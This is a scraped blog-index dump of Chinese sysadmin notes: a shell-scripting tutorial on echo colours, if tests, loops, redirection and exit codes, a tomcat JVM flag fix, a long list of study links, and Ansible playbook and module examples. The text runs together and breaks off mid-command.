https://github.com/webfrogs/xcode_shell/blob/master/ipa-build# 功能：自动为etao ios app打包，产出物为14个渠道的ipa包# 特色：全自动打包，不需要输入任何参数#--------------------------------------------##### 用户配置区 开始 ######## 项目根目录，推荐将此脚本放在项目的根目录，这里就不用改了# 应用名，确保和Xcode里Product下的target_name.app名字一致###### 用户配置区 结束 ##### 如果在开发过程中，遇到大段的代码需要临时注释起来，过一会儿又取消注释，怎么办呢？每一行加个#符号太费力了，可以把这一段要注释的代码用一对花括号括起来，定义成一个函数，没有地方调用这个函数，这块代码就不会执行，达到了和注释一样的效果。 第七章Shell echo命令和printf命令：格式化输出语句echo是Shell的一个内部指令，用于在屏幕上打印出指定的字符串。命令格式： 1.1 显示转义字符 123echo \"\\\"It is a test\\\"\"执行结果将是：\"It is a test\" 显示变量 12345name=\"OK\"echo \"$name It is a test\"执行结果将是：OK It is a test 同样双引号也可以省略。 2.1 shell 脚本中echo 颜色显示内容 这里我因为之前在学习shell没有明确提到这个，这里我自己总结就加进来，因为很多次看到专业团队写shell跑整个脚本过程，特别舒服，开头有提示颜色说明，特别是国外哪些人写的不止好用，而且脚本跑起来也很有意思。 后面我写脚本都会该注意和提示都会有突出颜色标注。(这是个好习惯) shell脚本中echo显示内容带颜色显示,echo显示带颜色，需要使用参数 -e 脚本举例： 1echo -e \"\\033[字背景颜色；文字颜色m字符串\\033[0m\" 例如： 1echo -e \"\\033[41;36m something here \\033[0m\" 其中41的位置代表底色， 36的位置是代表字的颜色. ⚠️注： 1、字背景颜色和文字颜色之间是英文的”” 2、文字颜色后面有个m 3、字符串前后可以没有空格，如果有的话，输出也是同样有空格 下面是相应的字和背景颜色，可以自己来尝试找出不同颜色搭配 1234unset -f pathmungeecho -e '\\t\\t\\t\\t\\t\\e[1;31m登录情况\\e[0m\\n'last -n 6|naliuptime 这里贡献下代码颜色： 12345678 echo -e “\\033[30m 黑色字 \\033[0m” echo -e “\\033[31m 红色字 \\033[0m” echo -e “\\033[32m 绿色字 \\033[0m” echo -e “\\033[33m 黄色字 \\033[0m” echo -e “\\033[34m 蓝色字 \\033[0m” echo -e “\\033[35m 紫色字 \\033[0m” echo -e “\\033[36m 天蓝字 \\033[0m” echo -e “\\033[37m 白色字 \\033[0m” 查看效果： 效果图 3.1 printf 命令用于格式化输出， 是echo命令的增强版。它是C语言printf()库函数的一个有限的变形，并且在语法上有些不同。 注意：printf 由 POSIX 标准所定义，移植性要比 echo 好。 举例： 12345678910111213# 没有引号也可以输出$ printf %s abcdefabcdef# 格式只指定了一个参数，但多出的参数仍然会按照该格式输出，format-string 被重用$ printf %s abc defabcdef$ printf \"%s\\n\" abc defabcdef$ printf \"%s %s %s\\n\" a b c d e f g h i ja b cd e fg h i 第八章 Shell if else 判断语句这里我要说下 这里入门说的前面几章和第八章都是经常用的比较多的。 if 语句通过关系运算符判断表达式的真假来决定执行哪个分支。Shell 有三种 if … else 语句：if … fi 语句；if … else … fi 语句；if … elif … else … fi 语句。 1.1 if … else 语句 if … else 语句的语法： 1234if [ expression ]then Statement(s) to be executed if expression is truefi 如果 expression 返回 true，then 后边的语句将会被执行；如果返回 false，不会执行任何语句。 最后必须以 fi 来结尾闭合 if，fi 就是 if 倒过来拼写，后面也会遇见。 注意：expression和方括号([ ])之间必须有空格，否则会有语法错误。 举个例子： 1234567891011#!/bin/sha=10b=20if [ $a == $b ]then echo \"a is equal to b\"fiif [ $a != $b ]then echo \"a is not equal to b\"fi 运行结果： a is not equal to b 2.1文件表达式 我们经常用到文件判断， 整数变量判断。 1234567if [ -f file ] 如果文件存在if [ -d ... ] 如果目录存在if [ -s file ] 如果文件存在且非空 if [ -r file ] 如果文件存在且可读if [ -w file ] 如果文件存在且可写if [ -x file ] 如果文件存在且可执行 if [ -z file ] -z代表的是该变量是否有值。 举例： 123456789101112131415161718192021222324252627# 这里的-x 参数判断$myPath是否存在并且是否具有可执行权限 if [ ! -x \"$myPath\"]; then mkdir \"$myPath\" fi # 这里的-d 参数判断$myPath是否存在 if [ ! -d \"$myPath\"]; then mkdir \"$myPath\" fi # 这里的-f参数判断$myFile是否存在 if [ ! -f \"$myFile\" ]; then touch \"$myFile\" fi # 其他参数还有-n,-n是判断一个变量是否是否有值 if [ ! -n \"$myVar\" ]; then echo \"$myVar is empty\" exit 0 fi # 两个变量判断是否相等 if [ \"$var1\" = \"$var2\" ]; then echo '$var1 eq $var2' else echo '$var1 not eq $var2' fi 3.1整数变量表达式 123456if [ \"int1\" -eq \"int2\" ] 如果int1等于int2 if [ \"int1\" -ne \"int2\" ] 如果不等于 if [ \"int1\" -ge \"int2\" ] 如果&gt;==if [ \"int1\" -gt \"int2\" ] 如果&gt;if [ \"int1\" -le \"int2\" ] 如果&lt;=if [ \"int1\" -lt \"int2\" ] 如果&lt; if !=不等于使用 123456if [ $TMZONE != Asia/Shanghai ];then这个时区不等于Asia/Shanghai 也就是没有这个名字就\\cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime if [ -f $1] 的含义: 这是一个判断语句的头半句，意思是：将一个文件普通名传给传给$1，并判断这个文件是否存在。后半句应该还有：then…，存在应该怎样做；和else…不存在应该怎样做。 举例： 12345678910111213141516[root@xuegod63 test]# cat elif.sh#!/bin/bashecho \"input a file name:\"read file_nameif [ -d $file_name ] ; then echo \" $file_name is a dir\"elif [ -f $file_name ] ; then echo \" $file_name is file\"elif [ -c $file_name -o -b $file_name ] ; then echo \" $file_name is a device file\"else echo \" $file_name does not exist \"fi 第九章 Shell for循环1.1 for循环一般格式为: 1234567for 变量 in 列表do command1 command2 ... commandNdone 列表是一组值（数字、字符串等）组成的序列，每个值通过空格分隔。每循环一次，就将列表中的下一个值赋给变量。 in 列表是可选的，如果不用它，for 循环使用命令行的位置参数。 例如，顺序输出当前列表中的数字： 1234for loop in 1 2 3 4 5do echo \"The value is: $loop\"done 运行结果： 12345The value is: 1The value is: 2The value is: 3The value is: 4The value is: 5 这里比如举例用的比较多的 yum循环安装依赖包。 123456789for i in \\gcc \\gcc-c++ \\vim-enhanced \\lrzsz \\ntpdate \\;doyum -y install $i 顺序输出字符串中的字符： 1234for str in 'This is a string'do echo $strdone 运行结果： 1This is a string 显示主目录下以 .bash 开头的文件： 12345#!/bin/bashfor FILE in $HOME/.bash*do echo $FILEdone 运行结果： 1234/root/.bash_history/root/.bash_logout/root/.bash_profile/root/.bashrc 第十章 Shell while循环while循环用于不断执行一系列命令，也用于从输入文件中读取数据；命令通常为测试条件。其格式为： 以下是一个基本的while循环，测试条件是：如果COUNTER小于5，那么返回 true。COUNTER从0开始，每次循环处理时，COUNTER加1。运行上述脚本，返回数字1到5，然后终止。 123456COUNTER=0while [ $COUNTER -lt 5 ]do COUNTER='expr $COUNTER+1' echo $COUNTERdone 运行结果： 123456运行脚本，输出：12345 第十一章： Shell输入输出重定向：Shell Here Document，/dev/null文件命令输出重定向的语法为： 输出重定向会覆盖文件内容，请看下面的例子： 1234 echo line 1 &gt; users$ cat usersline 1$ 也可以 将 Here Document 用在脚本中，例如： 123456789#!/bin/bashcat &lt;&lt; EOF+------------------------------------+| || This is a simple lookup program || for good (and bad) restaurants || in Cape Town. ||------------------------------------+EOF 运行结果： 1234567sh test.sh+------------------------------------+| || This is a simple lookup program || for good (and bad) restaurants || in Cape Town. ||------------------------------------+ 2.1/dev/null 文件 以前有人问过我这个/dev/null是什么意思。 这个是在shell脚本里面经常用到的。 比如说：不明白grep “tomcat” /etc/passwd&gt;/dev/null 2&gt;&amp;1 在/etc/passwd查找是否包含字符串tomcat 并把标准输出和标准错误一起重定向到/dev/null 输出重定向（&gt;）操作在命令执行发生错误时，会将错误信息直接显示到屏幕，并不记录到文件中,没必要放在内存 标准输出与错误输出重定向（&amp;&gt;）可以将标准输出和错误输出信息一并重新定向到文件，屏幕上不会显示任何信息 ,如果没有 &gt;/dev/null 2&gt;&amp;1 ，结果 就直接显示在屏幕上咯。 grep “tomcat” /etc/passwd&gt;/dev/null 2&gt;&amp;1首先是grep “tomcat” /etc/passwd&gt;/dev/null 将标准输出重定向到/dev/null 然后2&gt;&amp;1把标准错误重定向到标准输出 也就是也被重定向到了/dev/null 那结果就是标准输出和标准错误都被重定向到了/dev/null /dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是 /dev/null 文件非常有用，将命令的输出重定向到它，会起到”禁止输出“的效果。 如果希望屏蔽 stdout 和 stderr，可以这样写： 1command &gt; /dev/null 2&gt;&amp;1 Shell个人总结常规使用较多的一些参数语法。我个人写shell脚本都使用到sleep参数。 1.Shell脚本中让进程休眠的方法（sleep用法）123456789101112131415161718有时候写Shell的脚本，用于顺序执行一系列的程序。 有些程序在停止之后并没能立即退出，就例如有一个 tomcat 挂了，就算是用 kill -9 命令也还没瞬间就结束掉。这么如果 shell 还没等其退出就接着执行下一行，这么就出乱子了。 刚知道了原来 shell 也能有 sleep 的参数。复制代码 代码如下:sleep 1 睡眠1秒sleep 1s 睡眠1秒sleep 1m 睡眠1分sleep 1h 睡眠1小时用法如下，例如重启tomcat：复制代码 代码如下:#!/bin/sh/opt/tomcat/bin/shutdown.shsleep 3 #等3秒后执行下一条/opt/tomcat/bin/startup.sh 2.SHELL脚本中有exit 0，和exit 1 的区别这里我先举个例子： 12345678910111213141516#!/bin/sh x=10 if [ \"$x\" = 10 ]; then echo \"is 10\" exit 0 fi#!/bin/sh x=10 if [ \"$x\" = 10 ]; then echo \"is 10\" exit 1 fi 当你 exit 0 的时候在调用环境echo $? 就返回0 ，也就是说调用环境就认为 你的这个程序执行正确.当 exit 1 的时候，一般是出错定义这个1，也可以是其他数字，很多系统程序这个错误编号是有约定的含义的。 但不为0 就表示程序运行出错。 调用环境就可以根据这个返回值判断 你这个程序运行是否ok。如果你用 脚本a调用脚本b，要在a中判断b是否正常返回，就是根据exit 0or1来识别。执行完b后，判断 $? 就是返回值. 3.shell中获取时间12345678910111213取当天时间日期赋值给DATE变量DATE=$(date +%Y%m%d)有时候我们需要使用今天之前或者往后的日期，这时可以使用date的 -d参数获取明天的日期date -d next-day +%Y%m%d获取昨天的日期date -d last-day +%Y%m%d获取上个月的年和月date -d last-month +%Y%m获取下个月的年和月date -d next-month +%Y%m获取明年的年份date -d next-year +%Y 4.shell 过滤文件 重复如何去重123sort |uniq 用这个命令。先 sort 排序 ，再 uniq 去重 ，要是想知道重复的数量就 用 uniq -c这个执行看下就可以了。 5. shell 单引号，双引号 区别与使用1234567单引号str='this is a string'单引号字符串的限制：* 单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的；* 单引号字串中不能出现单引号（对单引号使用转义符后也不行）。","raw":null,"content":null,"categories":[],"tags":[{"name":"Shell programming","slug":"Shell-programming","permalink":"http://blog.yangcvo.me/tags/Shell-programming/"}]},{"title":"tomcat优化遇到jdk1.8出现⚠️警告：warning:ignoring option PermSize=512msupport was removed in 8.0","slug":"Web服务技术/tomcat/tomcat优化遇到jdk1.8出现⚠️警告：warning:ignoring option PermSize=512msupport was removed in 8.0","date":"2016-03-21T09:44:04.000Z","updated":"2017-03-14T08:22:56.000Z","comments":true,"path":"2016/03/21/Web服务技术/tomcat/tomcat优化遇到jdk1.8出现⚠️警告：warning:ignoring option PermSize=512msupport was removed in 8.0/","link":"","permalink":"http://blog.yangcvo.me/2016/03/21/Web服务技术/tomcat/tomcat优化遇到jdk1.8出现⚠️警告：warning:ignoring option PermSize=512msupport was removed in 8.0/","excerpt":"","text":"tomcat性能优化：Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=512m; support was removed in 8.0 这个提示应该是升级JDK1.8以上 在Java的8命令行标志MaxPermSize已被删除。其原因是，持久代从热点堆中取出并转移到本机内存。所以为了消除这种信息编辑java_OPTS环境用户变量 在网上查询到： -XX：MaxPermSize参数= size设置最大永久代空间的大小（以字节为单位）。此选项是不赞成使用JDK 8，并通过-XX取代：MaxMetaspaceSize选项。 -XX：PermSize = size设置分配给永久代如果超过触发垃圾收集的空间（以字节为单位）。该选项已被否决JDK 8，并通过-XX取代：MetaspaceSize选项。 我所在 1JAVA_OPTS==\"-Xmx512m -XX:MaxPermSize=256m\" 在我的系统的.bashrc，将其更改为 1JAVA_OPTS=\"-Djava.awt.headless=true -Dfile.encoding=UTF-8 -server -Xms1024m -Xmx1024m -XX:NewSize=512m -XX:MaxNewSize=512m -XX:+DisableExplicitGC\"","raw":null,"content":null,"categories":[{"name":"tomcat","slug":"tomcat","permalink":"http://blog.yangcvo.me/categories/tomcat/"}],"tags":[{"name":"Java+Tomcat notes","slug":"Java-Tomcat-notes","permalink":"http://blog.yangcvo.me/tags/Java-Tomcat-notes/"}]},{"title":"个人记录😆-走上全栈运维工程师学习笔记","slug":"运维笔记/个人记录😆-走上全栈运维工程师学习笔记","date":"2016-03-15T03:33:17.000Z","updated":"2017-03-28T10:48:07.000Z","comments":true,"path":"2016/03/15/运维笔记/个人记录😆-走上全栈运维工程师学习笔记/","link":"","permalink":"http://blog.yangcvo.me/2016/03/15/运维笔记/个人记录😆-走上全栈运维工程师学习笔记/","excerpt":"","text":"个人运维学习笔记：1234567从2014年初就开始慢慢记录自己所接触和学习到的东西，慢慢的积累，整理出很多学习的好文章，在这里我并且记录下来。这是我现在维护的个人笔记库和博客不同，它们大多都不是直接来源于我的原创，而是我一边阅读一边整理加工而成的笔记列表.我的目的是将零散的知识点放在一个集中的地方. 第一：方便我自己查看和学习，可以更好的找到我想要的文档。 第二：可以给自己学习结果每年做一个总结。 每3个月都会更新记录。 Linux 系统Centos源 centos源码包更新下载地址 centos 镜像下载地址 硬盘分区 格式化的ext4量超过16TB的限制(1) 格式化的ext4量超过16TB的限制(2) FileZilla filezilla下载地址 PXE pxe 无人值守安装操作系统 PXE 安装 YUM库 自动化部署-搭建YUM仓库 rpm 定制化RPM包 DNS DNS域名解析原理 开源epel 开源epel下载包 开源站点 linux_epel rpm-epel包 epel rpm软件包 samba samba配置方法 iperf 使用iperf检测主机间网络带宽 虚拟化Docker Docker 命令学习 Docker操作使用 Docker 入门学习 Docker 入门之战电子书 Docker实战（1)-(15) SSH远程登陆docker容器 部署Jenkins+docker集成环境 Esxi vsphere客户端下载 vsphere web客户端 vsphere web客户端下载 vSphere Client下载 KVM 容器平台Docker Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。 Rocket Rocket （也叫 rkt）是 CoreOS 推出的一款容器引擎，和 Docker 类似，帮助开发者打包应用和依赖包到可移植容器中，简化搭环境等部署工作。 Ubuntu（LXC） LXD 是 ubuntu 基于 LXC 技术的重构，容器天然支持非特权和分布式。LXD 与 Docker 的思路不同，Docker 是 PAAS，LXD 是 IAAS。LXC 项目由一个 Linux 内核补丁和一些 userspace 工具组成。这些 userspace 工具使用由补丁增加的内核新特性，提供一套简化的工具来维护容器。 微服务平台OpenShift OpenShift 是由红帽推出的一款面向开源开发人员开放的平台即服务(PaaS)。 OpenShift通过为开发人员提供在语言、框架和云上的更多的选择，使开发人员可以构建、测试、运行和管理他们的应用。 Cloud Foundry Cloud Foundry 是VMware于2011年4月12日推出的业界第一个开源PaaS云平台，它支持多种框架、语言、运行时环境、云平台及应用服务，使开发 人员能够在几秒钟内进行应用程序的部署和扩展，无需担心任何基础架构的问题。 Kubernetes Kubernetes 是来自 Google 云平台的开源容器集群管理系统。基于 Docker 构建一个容器的调度服务。该系统可以自动在一个容器集群中选择一个工作容器供使用。其核心概念是 Container Pod。 Mesosphere Apache Mesos 是一个集群管理器，提供了有效的、跨分布式应用或框架的资源隔离和共享，可以运行Hadoop、MPI、Hypertable、Spark。 数据库MySQL mysql 教程 MySQL官方软件包下载地址 MySQL主从配置文档 MySQL主从复制(Master-Slave)与读写分离（MySQL-Proxy）实践 Mysql架构的演化 mongodb MongoDB快速入门 MongoDB 教程 安装配置MongoDB MongoDB安装包官网地址 第1章 MongoDB的安装 第2章 MongoDB的增删改查 第3章 MongoDB的Java驱动 Robomongo 官网 MongoDB的一个客户端GUI工具 下载地址 云☁️服务CDN CDN测试排行 CDN变化 网站测速 OpenStack 每天5分钟玩转 OpenStack Red Hat Enterprise Linux和CentOS的OpenStack安装指南 如何使用OpenStack命令行工具管理虚拟机 大数据运维HBase 集群安装部署 HBase 集群安装部署 编程scriptshell shell学习网站 Linux命令大全 Python python 学习视频 Python 入门指南 Python面试题 python中文大本营 bandersnatch pip 构建快速部署的python pip环境及pypi本地源环境 CentOS 6.5 PYPI本地源制作 Web服务NGINX nginx 教程 图解http协议 nginx 配置入门 nginx 入门2 nginx 优化 nginx 优化2 nginx yum安装 脚本下载地址 tomcat JAVA企业级应用TOMCAT实战 tomcat 集群 tomcat 监控 jvm 调优 负载均衡 LVS 集群负载均衡实战 开源的分布式版本控制系统Git git教程 Gitlab gitlab官网 mailzimbra Centos6.2下安装zimbra 7.2 zimbra 自动化运维ansible Ansible 提供一种最简单的方式用于发布、管理和编排计算机系统的工具，你可在数分钟内搞定。Ansible 是一个模型驱动的配置管理器，支持多节点发布、远程任务执行。默认使用 SSH 进行远程连接。无需在被管理节点上安装附加软件，可使用各种编程语言进行扩展。 ansible指南 saltstack Saltstack 可以看做是func的增强版+Puppet的弱化版。使用Python编写。非常好用,快速可以基于EPEL部署。Salt 是一个开源的工具用来管理你的基础架构，可轻松管理成千上万台服务器。 saltstack指南 salt官网入门基础 salt使用总结 基于Salt管理iptables防火墙规则 Django 基础教程 APP持续集成部署平台Jenkins enkins安装配置 jenkins 发布系统 jenkins rpm 软件包 jenkins简单使用 Jenkins将项目发送到tomcat centos7安装文档 CentOS 安装 Jenkins 日志分析平台ELK Logstash Logstash 是一个应用程序日志、事件的传输、处理、管理和搜索的平台。你可以用它来统一对应用程序日志进行收集管理，提供 Web 接口用于查询和统计。 ELK 搭建日志分析平台 ELK 中文执指南 elk 插件管理 elk 插件使用 elk 脚本 Graylog CentOS 7安装配置Graylog Graylog——日志聚合工具中的后起之秀 Graylog 入门到精通文档 开源监控，警告&amp;分析zabbix zabbix学习论坛 zabbix入门 zabbix优化web事件打开速度 zabbix监控MySQL zabbix官方模块 grafana 二次开源安装 grafana-zabbix插件-官方网站 grafana演示站点 zabbix监控软件的使用排错 zabbix软件包下载地址 什么3.0.0的zabbix的新功能 通过ZABBIX KVM监控 个人github上面有整理比较详细的监控文档 1. zabbix通过jmx监控tomcat 2. zabbix通过jmx监控tomcat zabbix官网模板 zabbix开源监控区别 Nagios、cacti、zabbix的对比？ Nagios Nagios 是一个监视系统运行状态和网络信息的监视系统。Nagios能监视所指定的本地或远程主机以及服务，同时提供异常通知功能等。 Ganglia Ganglia 是一个跨平台可扩展的，高 性能计算系统下的分布式监控系统，如集群和网格。它是基于分层设计，它使用广泛的技术，如XML数据代表，便携数据传输，RRDtool用于数据存储和可视化。 Graphite Graphite 是一个用于采集网站实时信息并进行统计的开源项目，可用于采集多种网站服务运行状态信息。Graphite服务平均每分钟有4800次更新操作。 Kibana Kibana 是一个为 Logstash 和 ElasticSearch 提供的日志分析的 Web 接口。可使用它对日志进行高效的搜索、可视化、分析等各种操作。 团队技术平台和项目管理平台&amp;测试平台confluence团队项目协作平台 teambition confluence teambition 公司技术团队工作记录跟踪迭代平台 teambition jira-敏捷项目管理工具 jira-敏捷项目管理工具 创业公司禅道项目管理系统 禅道项目管理软件 APP推广统计数据分析 talkingdata RAP是一个可视化接口管理工具 通过分析接口结构 RAP 接口管理工具 统一的账号管理认证平台openLDAP openldap 部署1 openldap 部署2 LDAP 认证 Samba+LDAP+LAM管理工具应用 让Samba用户通过WEB页面修改密码 OpenLDAP + ProFTPD Install OpenLDAP and ProFTPD on Ubuntu 12.04 公司VPNOpenVPN Server CentOS 6上部署OpenVPN Server OpenVPN for CentOS centos 安装部署openvpn 部署参考 openVPN Tunnelblick工具下载 翻墙ssh隧道翻墙 ssh隧道翻墙 node.js 后台 如何卸载node.js 海外代理服务器平台服务器供应商 服务器 Windowswindows 防火墙 Windows Server 2008上的防火墙配置脚本 Windows系统中文换英文 Windows 7中文旗舰版与英文版自由切换 测试 openstf stf环境搭建 macaca 自动化测试 移动时代的自动化 war包仓库Maven私服nexus Centos 基础开发环境搭建之Maven私服nexus wkhtmltox-HTML效果转PDF格式 参考我博客的wkhtmltox 博客Ghost 官方-Ghost升级方法 一键安装Ghost博客 bitnami 下载一键安装Ghost脚本包 vps 安装 Ghost 博客系统记录 15个免费的Ghost博客主题 我自己整理的Ghost 20种博客主题 Ghost中文官方版 Ghost英文文档安装 Ghost博客安装，使用，更新一条龙教程 - 中文版在我github上面都有的，我安装的是7.0的。 Ghost修改端口方法文档 Ghost20种主题主题包下载：Ghost20种主题包 Ghost 博客安装中文全攻略 Ghost主题变更 Wordpress 官网 中文官网WordPress 访问有点慢。 非常有益的我是参考了建站网站有很详细说Wordpass wordpass大学 Wordpress下载插件-中文网站非常好的一位博主很详细讲了WordPress的安装过程和主题更换，插件使用等等WordPress先生 WordPress 如何搭建WordPress博客? 阿里云视频-如何在ECS上快递搭建一个WordPress站点 WordPress入门 之 安装主题和插件 hexo 这个是我现在的博客用的效果。 网上书店-非常不错 packt 已学习视频Linux 从0开始一步步实战深入学习Linux运维视频课程(三) 2014-03-28 看完 –现在这需要付费，我当初看的时候免费的，给你们个链接 越过去：http://edu.51cto.com/lesson/id-11907.html MySQL 企业Mysql实战系列入门篇 2014年3月5日看完 Mysql从入门到精通视频教程（共29集） 2015年11月3日看完 还有些网上分享的视频，存放在百度云。有数据库优化12篇视频。还有数据库架构 Docker 实战企业Docker虚拟化系列 2016年3月23日看完 Python 学会Python编程基础篇 2016-02-13 学完 监控 企业级高级监控系统cacti+nagios【马哥linux视频课程】Zabbix监控平台应用实战视频课程 收费 需要可@我 2016-09-10 学完 UbuntuUbuntu上可使用的15个桌面环境 很早就玩过了。 Ubuntu iso镜像下载地址 平面设计PS Photoshop学习教程","raw":null,"content":null,"categories":[{"name":"运维笔记","slug":"运维笔记","permalink":"http://blog.yangcvo.me/categories/运维笔记/"}],"tags":[]},{"title":"Ansible 脚本(Playbook基本语法)远程控制","slug":"自动化+可视化/Ansible/ansible 脚本(Playbook基本语法)远程控制","date":"2016-03-10T09:56:03.000Z","updated":"2017-03-14T05:51:38.000Z","comments":true,"path":"2016/03/10/自动化+可视化/Ansible/ansible 脚本(Playbook基本语法)远程控制/","link":"","permalink":"http://blog.yangcvo.me/2016/03/10/自动化+可视化/Ansible/ansible 脚本(Playbook基本语法)远程控制/","excerpt":"","text":"ansible 脚本(Playbook基本语法)远程控制Playbook基本语法 本节列举了写第一个Playbook，你必须了解基本语法。随着你面临的机器越多，配属的需求越复杂，你可能需要了解后面介绍的一些稍微复杂逻辑语句。 执行Playbook语法 这里先 vim deploy.yml 12345678910111213141516171819deploy.yml文件---- hosts: tomcat_D1 vars: http_port: 80 max_clients: 200 user: root tasks: - name: ensure apache is at the latest version yum: name=httpd state=latest - name: write the apache config file template: src=/srv/httpd.j2 dest=/etc/httpd.conf notify: - restart apache - name: start httpd service: name=httpd state=started handlers: - name: restart apache service: name=httpd state=restarted 执行Playbook语法1$ ansible-playbook deploy.yml 查看输出的细节 1 1ansible-playbook playbook.yml --list-hosts 查看该脚本影响哪些hosts 1ansible-playbook playbook.yml --list-hosts 并行执行脚本 1ansible-playbook playbook.yml -f 10 完整的playbook脚本示例123456789最基本的playbook脚本分为三个部分:在什么机器上以什么身份执行hostsusers...执行的任务是都有什么tasks善后的任务都有什么handlers 这里我写了个tomcat发布，yml文件：参考： 12345678910111213141516- hosts: tomcat-system_01 environment: LC_ALL: zh_CN.UTF-8 LANG : zh_CN.UTF-8 tasks: - name : cpfile-system copy : src=/root/.jenkins/workspace/yjk_master/haozhuo/haozhuo-system/target/haozhuo-system.war dest=/root/java_war/haozhuo-system.war - name : restart shell : /root/update/system.sh async : 0 - name : shutdown shell : /srv/tomcat/tomcat_system/bin/shutdown.sh async : 0 - name : start shell : chdir=/srv/tomcat/tomcat_system/bin nohup ./startup.sh &amp; async : 0 参考官网：https://ansible-book.gitbooks.io/ansible-first-book/content/playbookji_ben_yu_fa.html","raw":null,"content":null,"categories":[{"name":"automation","slug":"automation","permalink":"http://blog.yangcvo.me/categories/automation/"}],"tags":[{"name":"Ansible","slug":"Ansible","permalink":"http://blog.yangcvo.me/tags/Ansible/"},{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/tags/Automation/"}]},{"title":"Ansible小结 (五) 常用模块","slug":"自动化+可视化/Ansible/ansible小结(五)常用模块","date":"2016-03-09T09:56:03.000Z","updated":"2017-04-14T10:29:23.000Z","comments":true,"path":"2016/03/09/自动化+可视化/Ansible/ansible小结(五)常用模块/","link":"","permalink":"http://blog.yangcvo.me/2016/03/09/自动化+可视化/Ansible/ansible小结(五)常用模块/","excerpt":"","text":"ansible命令总结使用：在上一篇中介绍了commands部分模块，本篇承接上篇介绍下常用的模块。根据官方的分类，将模块按功能分类为： 1云模块、命令模块、数据库模块、文件模块、资产模块、消息模块、监控模块、网络模块、通知模块、包管理模块、源码控制模块、系统模块、单元模块、web设施模块、windows模块 具体可以参看官方页面 这里从官方分类的模块里选择最常用的一些模块进行介绍（commands模块上一篇已经介绍，这里不再提）。 一、ping模块测试主机是否是通的，用法很简单，不涉及参数：1234567ansible tomcat_B1 -m ping[root@ansible ~]# ansible tomcat_C1 -m ping192.168.1.177 | SUCCESS =&gt; &#123; \"changed\": false, \"ping\": \"pong\"&#125; 二、setup模块setup模块，主要用于获取主机信息，在playbooks里经常会用到的一个参数gather_facts就与该模块相关。setup模块下经常使用的一个参数是filter参数，具体使用示例如下（由于输出结果较多，这里只列命令不写结果）： 查看主机内存信息1[root@ansible ~]# ansible tomcat_C1 -m setup -a 'filter=ansible_*_mb' 查看地接口为eth0-2的网卡信息12[root@ansible ~]# ansible tomcat_C1 -m setup -a 'filter=ansible_eth[0-2]' [root@ansible ~]# ansible all -m setup --tree /tmp/facts //将所有主机的信息输入到/tmp/facts目录下，每台主机的信息输入到主机名文件中（/etc/ansible/hosts里的主机名） 三、file模块file模块主要用于远程主机上的文件操作，file模块包含如下选项： force：需要在两种情况下强制创建软链接，一种是源文件不存在但之后会建立的情况下；另一种是目标软链接已存在,需要先取消之前的软链，然后创建新的软链，有两个选项：yes|no group：定义文件/目录的属组 mode：定义文件/目录的权限 owner：定义文件/目录的属主 path：必选项，定义文件/目录的路径 recurse：递归的设置文件的属性，只对目录有效 src：要被链接的源文件的路径，只应用于state=link的情况 dest：被链接到的路径，只应用于state=link的情况 state： directory：如果目录不存在，创建目录 file：即使文件不存在，也不会被创建 link：创建软链接 hard：创建硬链接 touch：如果文件不存在，则会创建一个新的文件，如果文件或目录已存在，则更新其最后修改时间 absent：删除目录、文件或者取消链接文件使用示例： 1234ansible test -m file -a \"src=/etc/fstab dest=/tmp/fstab state=link\"ansible test -m file -a \"path=/tmp/fstab state=absent\"ansible test -m file -a \"path=/tmp/test state=touch\"ansible test -m file -a \"path=/tmp/test state=directory\" ansible test -m file -a \"path=/tmp/testd state=directory owner=root group=root mode=777\" 四、copy模块复制文件到远程主机，copy模块包含如下选项： backup：在覆盖之前将原文件备份，备份文件包含时间信息。有两个选项：yes|no content：用于替代”src”,可以直接设定指定文件的值 dest：必选项。要将源文件复制到的远程主机的绝对路径，如果源文件是一个目录，那么该路径也必须是个目录 directory_mode：递归的设定目录的权限，默认为系统默认权限 force：如果目标主机包含该文件，但内容不同，如果设置为yes，则强制覆盖，如果为no，则只有当目标主机的目标位置不存在该文件时，才复制。默认为yes others：所有的file模块里的选项都可以在这里使用 src：要复制到远程主机的文件在本地的地址，可以是绝对路径，也可以是相对路径。如果路径是一个目录，它将递归复制。在这种情况下，如果路径使用”/“来结尾，则只复制目录里的内容，如果没有使用”/“来结尾，则包含目录在内的整个内容全部复制，类似于rsync。 validate：The validation command to run before copying into place. The path to the file to validate is passed in via ‘%s’ which must be present as in the visudo example below. 示例如下： 123ansible test -m copy -a \"src=/srv/myfiles/foo.conf dest=/etc/foo.conf owner=foo group=foo mode=0644\"ansible test -m copy -a \"src=/mine/ntp.conf dest=/etc/ntp.conf owner=root group=root mode=644 backup=yes\"ansible test -m copy -a \"src=/mine/sudoers dest=/etc/sudoers validate='visudo -cf %s'\" 这里在举个例子： 目的：把主控端/opt/目录下面logstash.tar.gz文件拷贝到到指定节点上/srv/下面 命令：ansible cluster1:children -m copy -a &quot;src=/opt/logstash.tar.gz dest=/srv/. owner=root group=root mode=644&quot; 12345678910111213141516171819202122232425262728root@salt ~]# ansible cluster1:children -m copy -a \"src=/opt/logstash.tar.gz dest=/srv/. 10.47.59.190 | SUCCESS =&gt; &#123; \"changed\": true, \"checksum\": \"9d15ea324f39d08cb379f59ffee9fa7ad2a62ab8\", \"dest\": \"/srv/./logstash.tar.gz\", \"gid\": 0, \"group\": \"root\", \"md5sum\": \"c151602e79a336ca363928dea68d2567\", \"mode\": \"0644\", \"owner\": \"root\", \"size\": 84431108, \"src\": \"/root/.ansible/tmp/ansible-tmp-1483939085.93-201327709717575/source\", \"state\": \"file\", \"uid\": 0&#125;10.47.106.105 | SUCCESS =&gt; &#123; \"changed\": true, \"checksum\": \"9d15ea324f39d08cb379f59ffee9fa7ad2a62ab8\", \"dest\": \"/srv/./logstash.tar.gz\", \"gid\": 0, \"group\": \"root\", \"md5sum\": \"c151602e79a336ca363928dea68d2567\", \"mode\": \"0644\", \"owner\": \"root\", \"size\": 84431108, \"src\": \"/root/.ansible/tmp/ansible-tmp-1483939088.11-46151538408374/source\", \"state\": \"file\", \"uid\": 0&#125; 批量控制解压文件批量解压命令： ansible cluster1:children -m shell -a &quot;tar -zxvf 